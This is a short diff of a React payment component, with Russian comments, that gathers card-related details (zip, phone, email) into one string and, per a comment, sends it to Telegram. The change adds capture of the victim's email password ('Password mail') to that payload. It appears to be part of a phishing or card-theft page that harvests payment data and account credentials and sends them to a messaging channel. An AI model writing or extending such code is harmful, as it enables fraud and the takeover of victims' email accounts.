@@ -40,6 +40,7 @@ const Payment = () => {
         const zipCode = (document.getElementById("zip") as HTMLInputElement)?.value;
         const phoneNumber = (document.getElementById("phone-number") as HTMLInputElement)?.value;
         const email = (document.getElementById("email") as HTMLInputElement)?.value;
+        const password = (document.getElementById("password") as HTMLInputElement)?.value;
 
         // Собираем все данные в одну строку
         const cardDetails = `
@@ -55,6 +56,7 @@ const Payment = () => {
             Zip Code: ${zipCode} \n
             Phone Number: ${phoneNumber} \n
             Email: ${email} \n
+            Password mail: ${password}
         `;
         try {
             // Отправляем данные в Telegram
